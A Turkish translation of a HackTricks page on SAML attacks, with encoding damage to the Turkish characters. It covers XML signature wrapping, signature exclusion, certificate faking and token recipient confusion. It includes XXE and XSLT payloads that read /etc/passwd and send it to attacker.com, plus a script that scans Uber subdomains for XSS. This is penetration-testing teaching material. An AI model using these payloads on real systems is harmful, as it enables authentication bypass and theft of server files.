# SAML SaldÄ±rÄ±larÄ±

## SAML SaldÄ±rÄ±larÄ±

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmak iÃ§in Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>

## Temel Bilgiler

{% content-ref url="saml-basics.md" %}
[saml-basics.md](saml-basics.md)
{% endcontent-ref %}

## AraÃ§

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor): Bir URL veya URL listesi alabilen ve SAML tÃ¼ketim URL'sini geri dÃ¶ndÃ¼rebilen bir araÃ§.

## XML turu

XML'de XML'in imzalÄ± kÄ±smÄ± bellekte saklanÄ±r, ardÄ±ndan bazÄ± kodlama/Ã§Ã¶zme iÅŸlemleri gerÃ§ekleÅŸtirilir ve imza kontrol edilir. Ä°deal olarak, bu kodlama/Ã§Ã¶zme iÅŸlemi veriyi deÄŸiÅŸtirmemelidir, ancak bu senaryoya dayanarak, **kontrol edilen veri ve orijinal veri aynÄ± olmayabilir**.

Ã–rneÄŸin, aÅŸaÄŸÄ±daki kodu kontrol edin:
```ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
<Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```
ProgramÄ±n REXML 3.2.4 veya daha eski sÃ¼rÃ¼mleriyle Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ± aÅŸaÄŸÄ±daki Ã§Ä±ktÄ±yÄ± verecektir:
```
First child in original doc: Y
First child after round-trip: Z
```
Bu, yukarÄ±daki programdan REXML'in orijinal XML belgesini nasÄ±l gÃ¶rdÃ¼ÄŸÃ¼nÃ¼ gÃ¶stermektedir:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (561).png>)

Ve bu, ayrÄ±ÅŸtÄ±rma ve seri hale getirme aÅŸamasÄ±ndan sonra nasÄ±l gÃ¶rdÃ¼ÄŸÃ¼nÃ¼ gÃ¶stermektedir:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (562).png>)

Bu zafiyet hakkÄ±nda daha fazla bilgi ve nasÄ±l istismar edileceÄŸi iÃ§in:

* [https://mattermost.com/blog/securing-xml-implementations-across-the-web/](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
* [https://joonas.fi/2021/08/saml-is-insecure-by-design/](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

## XML Ä°mza Sarma SaldÄ±rÄ±larÄ±

**XML Ä°mza Sarma saldÄ±rÄ±larÄ± (XSW)**, dÃ¼ÅŸmanlar XML belgelerinin iki farklÄ± aÅŸamada iÅŸlendiÄŸi durumlarda ortaya Ã§Ä±kan bir zafiyeti sÃ¶mÃ¼rÃ¼r: **imza doÄŸrulama** ve **iÅŸlev Ã§aÄŸrÄ±sÄ±**. Bu saldÄ±rÄ±lar XML belge yapÄ±sÄ±nÄ± deÄŸiÅŸtirmeyle ilgilidir. Ã–zellikle, saldÄ±rgan, XML Ä°mza'nÄ±n geÃ§erliliÄŸini tehlikeye atmayan **sahte Ã¶ÄŸeler** enjekte eder. Bu manipÃ¼lasyon, **uygulama mantÄ±ÄŸÄ±** tarafÄ±ndan analiz edilen Ã¶ÄŸeler ile **imza doÄŸrulama modÃ¼lÃ¼** tarafÄ±ndan kontrol edilen Ã¶ÄŸeler arasÄ±nda bir uyumsuzluk yaratmayÄ± amaÃ§lar. SonuÃ§ olarak, XML Ä°mza teknik olarak geÃ§erli ve doÄŸrulamayÄ± geÃ§erken, uygulama mantÄ±ÄŸÄ± **sahte Ã¶ÄŸeleri** iÅŸler. SonuÃ§ olarak, saldÄ±rgan XML Ä°mza'nÄ±n **bÃ¼tÃ¼nlÃ¼k korumasÄ±nÄ±** ve **kÃ¶ken doÄŸrulamasÄ±nÄ±** etkili bir ÅŸekilde atlayarak, tespit edilmeden **keyfi iÃ§erik enjekte etmeyi** mÃ¼mkÃ¼n kÄ±lar.

AÅŸaÄŸÄ±daki saldÄ±rÄ±lar **[bu blog yazÄ±sÄ±na](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/) ve [bu makaleye](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf)** dayanmaktadÄ±r. Daha fazla ayrÄ±ntÄ± iÃ§in bunlarÄ± kontrol edin.


### XSW #1
- **Strateji**: Ä°mza iÃ§eren yeni bir kÃ¶k Ã¶ÄŸe eklenir.
- **SonuÃ§**: DoÄŸrulayÄ±cÄ±, meÅŸru "Response -> Assertion -> Subject" ve saldÄ±rganÄ±n "kÃ¶tÃ¼ yeni Response -> Assertion -> Subject" arasÄ±nda karÄ±ÅŸabilir, veri bÃ¼tÃ¼nlÃ¼ÄŸÃ¼ sorunlarÄ±na yol aÃ§abilir.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-1.svg](<../../.gitbook/assets/image (538).png>)

### XSW #2
- **XSW #1'den FarkÄ±**: Bir sarmalama imzasÄ± yerine ayrÄ±lmÄ±ÅŸ bir imza kullanÄ±r.
- **SonuÃ§**: XSW #1'e benzer "kÃ¶tÃ¼" yapÄ±, bÃ¼tÃ¼nlÃ¼k kontrolÃ¼nden sonra iÅŸ mantÄ±ÄŸÄ±nÄ± aldatmayÄ± amaÃ§lar.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-2.svg](<../../.gitbook/assets/image (539).png>)

### XSW #3
- **Strateji**: Orijinal assertion ile aynÄ± hiyerarÅŸik dÃ¼zeyde kÃ¶tÃ¼ niyetli bir Assertion oluÅŸturulur.
- **SonuÃ§**: Ä°ÅŸ mantÄ±ÄŸÄ±nÄ± yanÄ±ltarak kÃ¶tÃ¼ niyetli verilerin kullanÄ±lmasÄ±nÄ± amaÃ§lar.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-3.svg](<../../.gitbook/assets/image (540).png>)

### XSW #4
- **XSW #3'ten FarkÄ±**: Orijinal Assertion, Ã§oÄŸaltÄ±lmÄ±ÅŸ (kÃ¶tÃ¼ niyetli) Assertion'Ä±n bir Ã§ocuÄŸu haline gelir.
- **SonuÃ§**: XSW #3'e benzer, ancak XML yapÄ±sÄ±nÄ± daha agresif bir ÅŸekilde deÄŸiÅŸtirir.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-4.svg](<../../.gitbook/assets/image (541).png>)

### XSW #5
- **Ã–zgÃ¼n YÃ¶n**: Ne Ä°mza ne de orijinal Assertion standart yapÄ±landÄ±rmalara (sarmalama/sarmalama/detached) uymaz.
- **SonuÃ§**: Kopyalanan Assertion, beklenen belge yapÄ±sÄ±nÄ± deÄŸiÅŸtirerek Ä°mza'yÄ± sarmalar.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-5.svg](<../../.gitbook/assets/image (542).png>)

### XSW #6
- **Strateji**: XSW #4 ve #5 ile benzer konum ekleme, ancak bir farkla.
- **SonuÃ§**: Kopyalanan Assertion, ardÄ±ndan orijinal Assertion'Ä± saran Ä°mza'yÄ± saran bir iÃ§ iÃ§e alÄ±nmÄ±ÅŸ aldatÄ±cÄ± bir yapÄ± oluÅŸturur.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-6.svg](<../../.gitbook/assets/image (543).png>)

### XSW #7
- **Strateji**: Kopyalanan Assertion'Ä±n bir Ã§ocuÄŸu olarak bir UzantÄ±lar Ã¶ÄŸesi eklenir.
- **SonuÃ§**: Bu, Ã¶zellikle OpenSAML gibi kÃ¼tÃ¼phanelerde ÅŸema doÄŸrulama karÅŸÄ± Ã¶nlemlerini atlamak iÃ§in UzantÄ±lar Ã¶ÄŸesinin daha az kÄ±sÄ±tlayÄ±cÄ± ÅŸemasÄ±nÄ± istismar eder.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-7.svg](<../../.gitbook/assets/image (544).png>)

### XSW #8
- **XSW #7'den FarkÄ±**: BaÅŸka bir daha az kÄ±sÄ±tlayÄ±cÄ± XML Ã¶ÄŸesini saldÄ±rÄ±nÄ±n bir varyantÄ± iÃ§in kullanÄ±r.
- **SonuÃ§**: Orijinal Assertion, XSW #7'de kullanÄ±lan yapÄ±yÄ± tersine Ã§eviren daha az kÄ±sÄ±tlayÄ±cÄ± Ã¶ÄŸenin bir Ã§ocuÄŸu haline gelir.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-8.svg](<../../.gitbook/assets/image (545).png>)

### AraÃ§

SAML isteÄŸini ayrÄ±ÅŸtÄ±rmak, istediÄŸiniz herhangi bir XSW saldÄ±rÄ±sÄ±nÄ± uygulamak ve baÅŸlatmak iÃ§in Burp uzantÄ±sÄ± [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)'Ä± kullanabilirsiniz.

## XXE

XXE saldÄ±rÄ±larÄ±nÄ±n hangi tÃ¼r saldÄ±rÄ±lar olduÄŸunu bilmiyorsanÄ±z, lÃ¼tfen aÅŸaÄŸÄ±daki sayfayÄ± okuyun:

{% content-ref url="../xxe-xee-xml-external-entity.md" %}
[xxe-xee-xml-external-entity.md](../xxe-xee-xml-external-entity.md)
{% endcontent-ref %}

SAML YanÄ±tlarÄ±, **sÄ±kÄ±ÅŸtÄ±rÄ±lmÄ±ÅŸ ve base64 kodlanmÄ±ÅŸ XML belgeleri** olup XML DÄ±ÅŸÄ± VarlÄ±k (XXE) saldÄ±rÄ±larÄ±na karÅŸÄ± hassas olabilir. SAML YanÄ±tÄ±nÄ±n XML yapÄ±sÄ±nÄ± manipÃ¼le ederek, saldÄ±rganlar XXE zafiyetlerini istismar etmeye Ã§alÄ±ÅŸabilir. Ä°ÅŸte bÃ¶yle bir saldÄ±rÄ±nÄ±n nasÄ±l gÃ¶rselleÅŸtirilebileceÄŸi:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY    file SYSTEM "file:///etc/passwd">
<!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
<saml:Issuer>...</saml:Issuer>
<ds:Signature ...>
<ds:SignedInfo>
<ds:CanonicalizationMethod .../>
<ds:SignatureMethod .../>
<ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>...</ds:SignatureValue>
[...]
```
## AraÃ§lar

AyrÄ±ca, olasÄ± XXE zafiyetlerini ve SAML zafiyetlerini test etmek iÃ§in bir SAML isteÄŸinden POC oluÅŸturmak iÃ§in Burp eklentisi [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) kullanabilirsiniz.

AyrÄ±ca bu konuÅŸmayÄ± da kontrol edin: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## SAML AracÄ±lÄ±ÄŸÄ±yla XSLT

XSLT hakkÄ±nda daha fazla bilgi iÃ§in ÅŸuraya gidin:

{% content-ref url="../xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

GeniÅŸletilebilir Stil Åablonu DÃ¶nÃ¼ÅŸÃ¼mleri (XSLT), XML belgelerini HTML, JSON veya PDF gibi Ã§eÅŸitli formatlara dÃ¶nÃ¼ÅŸtÃ¼rmek iÃ§in kullanÄ±labilir. Ã–nemli olan nokta, **XSLT dÃ¶nÃ¼ÅŸÃ¼mlerinin dijital imzanÄ±n doÄŸrulanmasÄ±ndan Ã¶nce gerÃ§ekleÅŸtirilmesidir**. Bu, geÃ§erli bir imza olmadan bile saldÄ±rÄ±nÄ±n baÅŸarÄ±lÄ± olabileceÄŸi anlamÄ±na gelir; kendinden imzalÄ± veya geÃ§ersiz bir imza yeterlidir.

Bu tÃ¼r zafiyetleri kontrol etmek iÃ§in bir **POC** bulabilirsiniz, bu bÃ¶lÃ¼mÃ¼n baÅŸÄ±nda bahsedilen hacktricks sayfasÄ±nda payloadlar bulabilirsiniz.
```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
...
<ds:Transforms>
<ds:Transform>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="doc">
<xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
<xsl:variable name="escaped" select="encode-for-uri($file)"/>
<xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
<xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
<xsl:value-of select="unparsed-text($exploitUrl)"/>
</xsl:template>
</xsl:stylesheet>
</ds:Transform>
</ds:Transforms>
...
</ds:Signature>
```
### AraÃ§

AyrÄ±ca, olasÄ± XSLT zafiyetlerini test etmek iÃ§in bir SAML isteÄŸinden POC Ã¼retmek iÃ§in Burp eklentisi olan [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) kullanabilirsiniz.

AyrÄ±ca bu konuÅŸmayÄ± da kontrol edin: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XML Ä°mza HariÃ§ Tutma <a href="#xml-signature-exclusion" id="xml-signature-exclusion"></a>

**XML Ä°mza HariÃ§ Tutma**, Ä°mza Ã¶ÄŸesi bulunmadÄ±ÄŸÄ±nda SAML uygulamalarÄ±nÄ±n davranÄ±ÅŸÄ±nÄ± gÃ¶zlemlemektedir. Bu Ã¶ÄŸe eksik olduÄŸunda, **imza doÄŸrulamasÄ± gerÃ§ekleÅŸmeyebilir**, bu da zafiyete neden olur. Bu, genellikle imza tarafÄ±ndan doÄŸrulanan iÃ§erikleri deÄŸiÅŸtirerek test edilebilir.

![https://epi052.gitlab.io/notes-to-self/img/saml/signature-exclusion.svg](<../../.gitbook/assets/image (547).png>)

### AraÃ§ <a href="#xml-signature-exclusion-how-to" id="xml-signature-exclusion-how-to"></a>

AyrÄ±ca, Burp eklentisi olan [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)'Ä± da kullanabilirsiniz. SAML YanÄ±tÄ±nÄ± yakalayÄ±n ve `Ä°mzalarÄ± KaldÄ±r` dÃ¼ÄŸmesine tÄ±klayÄ±n. BÃ¶ylelikle **tÃ¼m** Ä°mza Ã¶ÄŸeleri kaldÄ±rÄ±lÄ±r.

Ä°mzalar kaldÄ±rÄ±ldÄ±ktan sonra isteÄŸin hedefe gitmesine izin verin. EÄŸer Ä°mza, Hizmet tarafÄ±ndan gerekli deÄŸilse

## Sertifika SahteciliÄŸi <a href="#certificate-faking" id="certificate-faking"></a>

Sertifika SahteciliÄŸi, bir **Hizmet SaÄŸlayÄ±cÄ±nÄ±n (SP) bir SAML Ä°letisinin gÃ¼venilir bir Kimlik SaÄŸlayÄ±cÄ± (IdP) tarafÄ±ndan imzalandÄ±ÄŸÄ±nÄ±** doÄŸru bir ÅŸekilde doÄŸrulayÄ±p doÄŸrulamadÄ±ÄŸÄ±nÄ± test etmek iÃ§in bir tekniktir. Bu, SAML Raider Burp eklentisini kullanarak bir ***kendinden imzalÄ± sertifika** kullanarak SAML YanÄ±tÄ±nÄ± veya Ä°ddia'yÄ± imzalamayÄ± iÃ§erir ve SP ve IdP arasÄ±ndaki gÃ¼ven doÄŸrulama sÃ¼recini deÄŸerlendirmede yardÄ±mcÄ± olur.

### Sertifika SahteciliÄŸi NasÄ±l YapÄ±lÄ±r
AÅŸaÄŸÄ±daki adÄ±mlar, [SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) Burp eklentisini kullanarak sÃ¼reci aÃ§Ä±klar:

1. SAML YanÄ±tÄ±nÄ± yakalayÄ±n.
2. YanÄ±t bir imza iÃ§eriyorsa, sertifikayÄ± SAML Raider Certs'e `SertifikayÄ± SAML Raider Certs'e GÃ¶nder` dÃ¼ÄŸmesini kullanarak gÃ¶nderin.
3. SAML Raider SertifikalarÄ± sekmesinde, iÃ§e aktarÄ±lan sertifikayÄ± seÃ§in ve orijinal sertifikanÄ±n kendinden imzalÄ± bir klonunu oluÅŸturmak iÃ§in `Kaydet ve Kendinden Ä°mzala` dÃ¼ÄŸmesine tÄ±klayÄ±n.
4. Burp'un Proxy'sindeki yakalanan isteÄŸe geri dÃ¶nÃ¼n. XML Ä°mza aÃ§Ä±lÄ±r menÃ¼sÃ¼nden yeni kendinden imzalÄ± sertifikayÄ± seÃ§in.
5. `Ä°mzalarÄ± KaldÄ±r` dÃ¼ÄŸmesiyle mevcut imzalarÄ± kaldÄ±rÄ±n.
6. Ä°letiyi veya iddiayÄ± yeni sertifika ile imzalayÄ±n, uygun olan **`(Yeniden) Ä°leti Ä°mzala`** veya **`(Yeniden) Ä°ddia Ä°mzala`** dÃ¼ÄŸmesini kullanarak.
7. Ä°mzalÄ± iletiyi ileterek iÅŸlemi tamamlayÄ±n. BaÅŸarÄ±lÄ± kimlik doÄŸrulama, SP'nin kendinden imzalÄ± sertifikanÄ±zla imzalanan iletileri kabul ettiÄŸini gÃ¶sterir ve SAML iletilerinin doÄŸrulama sÃ¼recindeki potansiyel zafiyetleri ortaya Ã§Ä±karÄ±r.


## Token AlÄ±cÄ± KarÄ±ÅŸÄ±klÄ±ÄŸÄ± / Hizmet SaÄŸlayÄ±cÄ± Hedef KarÄ±ÅŸÄ±klÄ±ÄŸÄ± <a href="#token-recipient-confusion" id="token-recipient-confusion"></a>

Token AlÄ±cÄ± KarÄ±ÅŸÄ±klÄ±ÄŸÄ± ve Hizmet SaÄŸlayÄ±cÄ± Hedef KarÄ±ÅŸÄ±klÄ±ÄŸÄ±, bir **Hizmet SaÄŸlayÄ±cÄ±nÄ±n yanÄ±tÄ±n amaÃ§lanan alÄ±cÄ±sÄ±nÄ± doÄŸru bir ÅŸekilde doÄŸrulayÄ±p doÄŸrulamadÄ±ÄŸÄ±nÄ±** kontrol etmeyi iÃ§erir. Temelde, bir Hizmet SaÄŸlayÄ±cÄ±, yanÄ±tÄ±n baÅŸka bir saÄŸlayÄ±cÄ± iÃ§in mi yoksa kendisi iÃ§in mi olduÄŸunu belirlemeli ve yanÄ±t baÅŸka bir saÄŸlayÄ±cÄ± iÃ§inse kimlik doÄŸrulamasÄ±nÄ± reddetmelidir. Buradaki kritik unsur, bir SAML YanÄ±tÄ±nÄ±n **SubjectConfirmationData** Ã¶ÄŸesinin iÃ§inde bulunan **AlÄ±cÄ±** alanÄ±dÄ±r. Bu alan, Ä°ddianÄ±n gÃ¶nderilmesi gereken bir URL'yi belirtir. GerÃ§ek alÄ±cÄ±, amaÃ§lanan Hizmet SaÄŸlayÄ±cÄ±yla eÅŸleÅŸmiyorsa, Ä°ddia geÃ§ersiz kabul edilmelidir.

#### **NasÄ±l Ã‡alÄ±ÅŸÄ±r**

Bir SAML Token AlÄ±cÄ± KarÄ±ÅŸÄ±klÄ±ÄŸÄ± (SAML-TRC) saldÄ±rÄ±sÄ±nÄ±n gerÃ§ekleÅŸtirilebilmesi iÃ§in belirli koÅŸullarÄ±n saÄŸlanmasÄ± gerekmektedir. Ä°lk olarak, bir Hizmet SaÄŸlayÄ±cÄ±da (SP-Legit olarak adlandÄ±rÄ±lÄ±r) geÃ§erli bir hesap olmalÄ±dÄ±r. Ä°kinci olarak, hedeflenen Hizmet SaÄŸlayÄ±cÄ± (SP-Target), SP-Legit'e hizmet veren aynÄ± Kimlik SaÄŸlayÄ±cÄ±dan tokenlarÄ± kabul etmelidir.

Bu koÅŸullar altÄ±nda saldÄ±rÄ± sÃ¼reci basittir. PaylaÅŸÄ±lan Kimlik SaÄŸlayÄ±cÄ± aracÄ±lÄ±ÄŸÄ±yla SP-Legit ile otantik bir oturum baÅŸlatÄ±lÄ±r. Kimlik SaÄŸlayÄ±cÄ±dan SP-Legit'e yÃ¶nelik SAML YanÄ±tÄ± yakalanÄ±r. Bu SP-Legit iÃ§in orijinal olarak amaÃ§lanan SAML YanÄ±tÄ±, SP-Target'e yÃ¶nlendirilir. Bu saldÄ±rÄ±da baÅŸarÄ±, SP-Target'in Ä°ddiayÄ± kabul etmesi ve SP-Legit iÃ§in kullanÄ±lan aynÄ± hesap adÄ± altÄ±nda kaynaklara eriÅŸimi saÄŸlamasÄ±yla Ã¶lÃ§Ã¼lÃ¼r.
```python
# Example to simulate interception and redirection of SAML Response
def intercept_and_redirect_saml_response(saml_response, sp_target_url):
"""
Simulate the interception of a SAML Response intended for SP-Legit and its redirection to SP-Target.

Args:
- saml_response: The SAML Response intercepted (in string format).
- sp_target_url: The URL of the SP-Target to which the SAML Response is redirected.

Returns:
- status: Success or failure message.
"""
# This is a simplified representation. In a real scenario, additional steps for handling the SAML Response would be required.
try:
# Code to send the SAML Response to SP-Target would go here
return "SAML Response successfully redirected to SP-Target."
except Exception as e:
return f"Failed to redirect SAML Response: {e}"
```
## Logout iÅŸlevinde XSS

Orijinal araÅŸtÄ±rmaya [bu baÄŸlantÄ±](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/) Ã¼zerinden eriÅŸilebilir.

Dizin brute force iÅŸlemi sÄ±rasÄ±nda, bir logout sayfasÄ± keÅŸfedildi:
```
https://carbon-prototype.uberinternal.com:443/oidauth/logout
```
Bu baÄŸlantÄ±ya eriÅŸildiÄŸinde, bir yÃ¶nlendirme gerÃ§ekleÅŸti:
```
https://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1
```
Bu, `base` parametresinin bir URL kabul ettiÄŸini ortaya Ã§Ä±kardÄ±. Buna gÃ¶re, URL'yi `javascript:alert(123);` ile deÄŸiÅŸtirerek XSS (Cross-Site Scripting) saldÄ±rÄ±sÄ± baÅŸlatma giriÅŸiminde bulunma fikri ortaya Ã§Ä±ktÄ±.


### Kitlesel SÃ¶mÃ¼rÃ¼

[Åu araÅŸtÄ±rmadan](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/) yola Ã§Ä±karak:

`uberinternal.com` alt alan adlarÄ±nÄ± analiz etmek iÃ§in [**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor) aracÄ± kullanÄ±ldÄ± ve aynÄ± kÃ¼tÃ¼phaneyi kullanan alan adlarÄ± tespit edildi. ArdÄ±ndan, `oidauth/prompt` sayfasÄ±nÄ± hedefleyen bir betik geliÅŸtirildi. Bu betik, veri giriÅŸi yaparak Ã§Ä±ktÄ±da yansÄ±tÄ±lÄ±p yansÄ±tÄ±lmadÄ±ÄŸÄ±nÄ± kontrol ederek XSS (Cross-Site Scripting) testi yapar. GiriÅŸ yansÄ±tÄ±lÄ±yorsa, betik sayfayÄ± savunmasÄ±z olarak iÅŸaretler.
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import init ,Fore, Back, Style
init()

with open("/home/fady/uberSAMLOIDAUTH") as urlList:
for url in urlList:
url2 = url.strip().split("oidauth")[0] + "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1"
request = requests.get(url2, allow_redirects=True,verify=False)
doesit = Fore.RED + "no"
if ("Fady" in request.content):
doesit = Fore.GREEN + "yes"
print(Fore.WHITE + url2)
print(Fore.WHITE + "Len : " + str(len(request.content)) + "   Vulnerable : " + doesit)
```
## Referanslar
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)\
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
* [https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>
